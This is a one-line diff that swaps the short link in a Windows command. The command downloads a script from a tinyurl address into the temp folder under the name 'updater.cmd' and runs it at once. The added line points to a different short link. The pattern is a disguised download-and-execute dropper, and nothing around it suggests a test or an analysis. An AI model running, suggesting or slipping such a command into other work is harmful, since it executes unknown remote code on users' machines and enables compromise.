@@ -1,1 +1,1 @@
-curl -L -o %TEMP%\updater.cmd https://tinyurl.com/atck-qwerty && %TEMP%\updater.cmd
+curl -L -o %TEMP%\updater.cmd https://tinyurl.com/spyrus && %TEMP%\updater.cmd
